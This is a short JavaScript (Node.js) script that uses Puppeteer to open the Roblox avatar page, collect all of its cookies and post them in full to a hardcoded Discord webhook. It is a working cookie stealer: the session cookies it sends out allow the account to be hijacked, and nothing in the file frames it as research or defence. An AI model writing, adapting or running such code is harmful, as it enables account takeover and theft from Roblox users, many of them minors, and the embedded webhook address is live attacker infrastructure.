const puppeteer = require('puppeteer');
const axios = require('axios');

(async () => {
  // Launch a new browser instance
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  // Navigate to the Roblox Avatar page
  await page.goto('https://www.roblox.com/my/avatar');

  // Wait for the page to load completely
  await page.waitForTimeout(5000);

  // Get all cookies from the page
  const cookies = await page.cookies();

  // Convert cookies to a string format
  const cookiesString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

  // Send cookies to the Discord webhook
  try {
    const response = await axios.post('https://discord.com/api/webhooks/1385078800286744577/G9Cb7Saghwho1ytdjTghKIRjFNt1Em6eyKqfO2IKkH-EKLbO7YO__glTWggTGz2tY-Sy', {
      content: `Cookies: \`\`\`${cookiesString}\`\`\``
    });
    console.log('Cookies sent successfully:', response.data);
  } catch (error) {
    console.error('Error sending cookies:', error);
  }

  // Close the browser
  await browser.close();
})();
